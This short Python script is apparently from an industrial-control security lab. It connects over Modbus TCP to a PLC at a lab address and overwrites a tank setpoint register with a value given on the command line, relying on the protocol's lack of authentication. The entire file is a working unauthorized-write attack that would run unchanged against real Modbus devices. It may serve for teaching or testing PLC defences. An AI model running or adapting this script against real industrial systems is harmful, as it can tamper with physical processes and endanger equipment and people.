"""Lab attack: an unauthorized host overwrites the tank SETPOINT (holding register 1).
Modbus has no login, so the PLC accepts it. Usage: python /scripts/attack_write.py 0   (or 100)"""
import sys
from pymodbus.client import ModbusTcpClient
value = int(sys.argv[1]) if len(sys.argv) > 1 else 0
c = ModbusTcpClient("172.28.0.10", port=502)
print("connected:", c.connect())
r = c.write_register(1, value)
print("write_register(1 ->", value, ") result:", r)
c.close()
